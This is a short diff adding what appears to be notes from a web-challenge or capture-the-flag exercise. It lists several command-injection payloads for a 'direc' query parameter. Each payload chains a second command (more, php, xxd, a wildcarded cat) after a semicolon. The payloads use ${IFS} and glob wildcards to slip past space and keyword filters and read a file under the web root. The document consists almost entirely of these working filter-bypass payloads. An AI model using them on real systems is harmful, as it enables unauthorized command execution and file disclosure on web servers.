@@ -1,0 +1,7 @@
+many commands still available :
+	?direc=;more${IFS}/v?r/www/??4?
+	?direc=;php${IFS}/v?r/www/??4?
+	?direc=;xxd${IFS}/v?r/www/??4?
+
+or maybe you can use wildcard for command
+	?direc=;/bin/c?t${IFS}/v?r/www/??4?
